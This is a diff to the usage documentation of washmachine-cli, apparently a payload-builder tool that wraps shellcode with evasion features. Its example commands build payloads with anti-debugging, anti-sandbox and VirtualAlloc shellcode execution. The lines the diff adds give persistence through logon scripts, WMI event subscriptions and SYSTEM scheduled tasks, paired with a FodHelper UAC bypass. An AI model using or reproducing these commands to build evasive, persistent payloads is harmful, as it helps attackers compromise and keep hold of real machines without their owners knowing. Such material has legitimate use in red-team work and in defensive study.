@@ -23,7 +23,7 @@ washmachine-cli compile -s payload.bin --json
 
 ## Selecting snippets
 
-Each template has placeholders for snippet sections (anti-debugging, evasion, injection, etc.). Override the default selection for any section with `--snippet`:
+Each template has placeholders for snippet sections (anti-debugging, evasion, injection, persistence, etc.). Override the default selection for any section with `--snippet`:
 
 ```powershell
 # Use a specific anti-emulation technique
@@ -34,6 +34,20 @@ washmachine-cli compile -s payload.bin -t default \
   --snippet antisandbox=Default \
   --snippet antidebugging=IsDebuggerPresent \
   --snippet shellcodeexecution=VirtualAlloc
+
+# Add user-level persistence (no admin required)
+washmachine-cli compile -s payload.bin -t default \
+  --snippet persistence=LogonScript
+
+# Add admin persistence — must also select a UAC bypass
+washmachine-cli compile -s payload.bin -t default \
+  --snippet uacb=FodHelper \
+  --snippet persistence=WmiEventSubscription
+
+# Boot-time SYSTEM execution via scheduled task
+washmachine-cli compile -s payload.bin -t default \
+  --snippet uacb=FodHelper \
+  --snippet persistence=SchtasksSystem
 ```
 
 Run `washmachine-cli list snippets` to see all available sections and item IDs.
